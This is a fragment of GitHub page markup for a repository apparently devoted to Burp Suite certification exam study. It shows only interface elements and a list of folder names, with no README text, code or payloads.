data-hotkey-scope="read-only-cursor-text-area"></button></div><div class="OverviewContent-module__Box_4--rOz8J"><a type="button" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/branches" class="prc-Button-ButtonBase-c50BI OverviewContent-module__Button--MDoYP" data-loading="false" data-size="medium" data-variant="invisible" aria-describedby=":Rclab:-loading-announcement"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-HKbr-"><span data-component="leadingVisual" class="prc-Button-Visual-2epfX prc-Button-VisualWrap-Db-eB"><svg aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></span><span data-component="text" class="prc-Button-Label-pTQ3x">Branches</span></span></a><a type="button" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tags" class="prc-Button-ButtonBase-c50BI OverviewContent-module__Button--MDoYP" data-loading="false" data-size="medium" data-variant="invisible" aria-describedby=":Rklab:-loading-announcement"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-HKbr-"><span data-component="leadingVisual" class="prc-Button-Visual-2epfX prc-Button-VisualWrap-Db-eB"><svg aria-hidden="true" focusable="false" class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"></path></svg></span><span data-component="text" class="prc-Button-Label-pTQ3x">Tags</span></span></a></div><div class="OverviewContent-module__Box_5--PPbL1"><a type="button" aria-label="Go to Branches page" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/branches" class="prc-Button-ButtonBase-c50BI OverviewContent-module__Button_1--_1Ng2" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="invisible" aria-describedby=":Relab:-loading-announcement"><svg aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></a><a type="button" aria-label="Go to Tags page" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tags" class="prc-Button-ButtonBase-c50BI OverviewContent-module__Button_1--_1Ng2" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="invisible" aria-describedby=":Rmlab:-loading-announcement"><svg aria-hidden="true" focusable="false" class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"></path></svg></a></div></div><div class="OverviewContent-module__Box_6--wV7Tw"><div class="OverviewContent-module__Box_7--SbxdI"><div class="OverviewContent-module__Box_8--oumpR"><!--$--><div class="Box-sc-62in7e-0 OverviewContent-module__FileResultsList--irMg6"><span class="TextInput__StyledTextInput-sc-ttxlvl-0 d-flex FileResultsList-module__FilesSearchBox--fSAh3 TextInput-wrapper prc-components-TextInputWrapper-i1ofR prc-components-TextInputBaseWrapper-ueK9q" data-leading-visual="true" data-trailing-visual="true" aria-busy="false"><span class="TextInput-icon" id=":R535ab:" aria-hidden="true"><svg aria-hidden="true" focusable="false" class="octicon octicon-search" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path></svg></span><input type="text" aria-label="Go to file" role="combobox" aria-controls="file-results-list" aria-expanded="false" aria-haspopup="dialog" autoCorrect="off" spellcheck="false" placeholder="Go to file" aria-describedby=":R535ab: :R535abH1:" data-component="input" class="prc-components-Input-Ic-y8" value=""/><span class="TextInput-icon" id=":R535abH1:" aria-hidden="true"></span></span></div><!--/$--></div><div class="OverviewContent-module__Box_9--mQYON"><button type="button" class="prc-Button-ButtonBase-c50BI" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" aria-describedby=":R1j5ab:-loading-announcement"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-HKbr-"><span data-component="text" class="prc-Button-Label-pTQ3x">Go to file</span></span></button></div></div><button type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-c50BI" data-loading="false" data-size="medium" data-variant="primary" aria-describedby=":R75ab:-loading-announcement" id=":R75ab:"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-HKbr-"><span data-component="leadingVisual" class="prc-Button-Visual-2epfX prc-Button-VisualWrap-Db-eB"><svg aria-hidden="true" focusable="false" class="octicon octicon-code hide-sm" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path></svg></span><span data-component="text" class="prc-Button-Label-pTQ3x">Code</span><span data-component="trailingVisual" class="prc-Button-Visual-2epfX prc-Button-VisualWrap-Db-eB"><svg aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></span></button><div class="OverviewContent-module__Box_10--ULKAG"><button data-component="IconButton" type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-c50BI prc-Button-IconButton-szpyj" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" aria-describedby=":R95ab:-loading-announcement" aria-labelledby=":R7p5ab:" id=":R95ab:"><svg aria-hidden="true" focusable="false" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-cYMVY" data-direction="n" aria-hidden="true" id=":R7p5ab:">Open more actions menu</span></div></div></div><div class="OverviewContent-module__Box_11--Tqhu2"><div data-hpc="true"><button hidden="" data-testid="focus-next-element-button" data-hotkey="j"></button><button hidden="" data-testid="focus-previous-element-button" data-hotkey="k"></button><h2 class="sr-only ScreenReaderHeading-module__userSelectNone--vlUbc prc-Heading-Heading-6CmGO" data-testid="screen-reader-heading" id="folders-and-files">Folders and files</h2><table class="Table-module__Box--KyMHK" aria-labelledby="folders-and-files"><thead class="DirectoryContent-module__OverviewHeaderRow--FlrUZ Table-module__Box_1--DkRqs"><tr class="Table-module__Box_2--l1wjV"><th colSpan="2" class="DirectoryContent-module__Box--y3Nvf"><span class="text-bold">Name</span></th><th colSpan="1" class="DirectoryContent-module__Box_1--xeAhp"><span class="text-bold">Name</span></th><th class="hide-sm"><div class="width-fit prc-Truncate-Truncate-A9Wn6" data-inline="true" title="Last commit message" style="--truncate-max-width:125px"><span class="text-bold">Last commit message</span></div></th><th colSpan="1" class="DirectoryContent-module__Box_2--h912w"><div class="width-fit prc-Truncate-Truncate-A9Wn6" data-inline="true" title="Last commit date" style="--truncate-max-width:125px"><span class="text-bold">Last commit date</span></div></th></tr></thead><tbody><tr class="DirectoryContent-module__Box_3--zI0N1"><td colSpan="3" class="bgColor-muted p-1 rounded-top-2"><div class="LatestCommit-module__Box--Fimpo"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone--vlUbc prc-Heading-Heading-6CmGO" data-testid="screen-reader-heading">Latest commit</h2><div style="width:120px" class="Skeleton Skeleton--text" data-testid="loading"></div><div class="d-flex flex-shrink-0 gap-2"><div data-testid="latest-commit-details" class="d-none d-sm-flex flex-items-center"></div><div class="d-flex gap-2"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone--vlUbc prc-Heading-Heading-6CmGO" data-testid="screen-reader-heading">History</h2><a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/commits/main/" class="prc-Button-ButtonBase-c50BI d-none d-lg-flex LinkButton-module__code-view-link-button--thtqc flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible" aria-describedby=":Raqj8pab:-loading-announcement"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-HKbr-"><span data-component="leadingVisual" class="prc-Button-Visual-2epfX prc-Button-VisualWrap-Db-eB"><svg aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span><span data-component="text" class="prc-Button-Label-pTQ3x"><span class="fgColor-default">782 Commits</span></span></span></a><div class="d-sm-none"></div><div class="d-flex d-lg-none"><span role="tooltip" aria-label="782 Commits" id="history-icon-button-tooltip" class="prc-Tooltip-Tooltip--1XZX prc-Tooltip-Tooltip--n-BOOzB tooltipped-n"><a aria-label="View commit history for this file." href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/commits/main/" class="prc-Button-ButtonBase-c50BI LinkButton-module__code-view-link-button--thtqc flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible" aria-describedby=":R1iqj8pab:-loading-announcement history-icon-button-tooltip"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-HKbr-"><span data-component="leadingVisual" class="prc-Button-Visual-2epfX prc-Button-VisualWrap-Db-eB"><svg aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span></span></a></span></div></div></div></div></td></tr><tr class="react-directory-row undefined" id="folder-row-0"><td class="react-directory-row-name-cell-small-screen" colSpan="2"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="code" aria-label="code, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/code" data-discover="true">code</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colSpan="1"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="code" aria-label="code, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/code" data-discover="true">code</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div class="Skeleton Skeleton--text"></div></td><td><div class="Skeleton Skeleton--text"></div></td></tr><tr class="react-directory-row undefined" id="folder-row-1"><td class="react-directory-row-name-cell-small-screen" colSpan="2"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="extras" aria-label="extras, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/extras" data-discover="true">extras</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colSpan="1"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="extras" aria-label="extras, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/extras" data-discover="true">extras</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div class="Skeleton Skeleton--text"></div></td><td><div class="Skeleton Skeleton--text"></div></td></tr><tr class="react-directory-row undefined" id="folder-row-2"><td class="react-directory-row-name-cell-small-screen" colSpan="2"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="images" aria-label="images, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/images" data-discover="true">images</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colSpan="1"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="images" aria-label="images, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/images" data-discover="true">images</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div class="Skeleton Skeleton--text"></div></td><td><div class="Skeleton Skeleton--text"></div></td></tr><tr class="react-directory-row undefined" id="folder-row-3"><td class="react-directory-row-name-cell-small-screen" colSpan="2"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="payloads" aria-label="payloads, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/payloads" data-discover="true">payloads</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colSpan="1"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="payloads" aria-label="payloads, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/payloads" data-discover="true">payloads</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div class="Skeleton Skeleton--text"></div></td><td><div class="Skeleton Skeleton--text"></div></td></tr><tr class="react-directory-row undefined" id="folder-row-4"><td class="react-directory-row-name-cell-small-screen" colSpan="2"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="python" aria-label="python, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python" data-discover="true">python</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colSpan="1"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="python" aria-label="python, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python" data-discover="true">python</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div class="Skeleton Skeleton--text"></div></td><td><div class="Skeleton Skeleton--text"></div></td></tr><tr class="react-directory-row undefined" id="folder-row-5"><td class="react-directory-row-name-cell-small-screen" colSpan="2"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="wordlists" aria-label="wordlists, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists" data-discover="true">wordlists</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colSpan="1"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="wordlists" aria-label="wordlists, (Directory)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists" data-discover="true">wordlists</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div class="Skeleton Skeleton--text"></div></td><td><div class="Skeleton Skeleton--text"></div></td></tr><tr class="react-directory-row undefined" id="folder-row-6"><td class="react-directory-row-name-cell-small-screen" colSpan="2"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="README.md" aria-label="README.md, (File)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md" data-discover="true">README.md</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colSpan="1"><div class="react-directory-filename-column"><svg aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="README.md" aria-label="README.md, (File)" class="Link--primary" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md" data-discover="true">README.md</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div class="Skeleton Skeleton--text"></div></td><td><div class="Skeleton Skeleton--text"></div></td></tr><tr class="d-none DirectoryContent-module__Box_4--QyUbd" data-testid="view-all-files-row"><td colSpan="3" class="DirectoryContent-module__Box_5--OJZQU"><div><button class="prc-Link-Link-85e08">View all files</button></div></td></tr></tbody></table></div><div class="OverviewRepoFiles-module__Box_1--xSt0T"><div class="OverviewRepoFiles-module__Box_2--yIjMp"><div itemscope="" itemType="https://schema.org/abstract" class="OverviewRepoFiles-module__Box_3--Bi2jM"><h2 class="prc-src-InternalVisuallyHidden-nlR9R">Repository files navigation</h2><nav class="prc-components-UnderlineWrapper-oOh5J OverviewRepoFiles-module__UnderlineNav--BHfFi" aria-label="Repository files" data-variant="inset"><ul class="prc-components-UnderlineItemList-b23Hf" role="list"><li class="prc-UnderlineNav-UnderlineNavItem--xDk1"><a href="#" aria-current="page" class="prc-components-UnderlineItem-lJsg-"><span data-component="icon"><svg aria-hidden="true" focusable="false" class="octicon octicon-book" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.743 3.743 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574ZM8.755 4.75l-.004 7.322a3.752 3.752 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25Z"></path></svg></span><span data-component="text" data-content="README">README</span></a></li></ul></nav><button type="button" aria-label="Outline" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-c50BI OverviewRepoFiles-module__ActionMenu_Button--xB9DS" data-loading="false" data-size="medium" data-variant="invisible" aria-describedby=":Rr9ab:-loading-announcement" id=":Rr9ab:"><svg aria-hidden="true" focusable="false" class="octicon octicon-list-unordered" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M5.75 2.5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 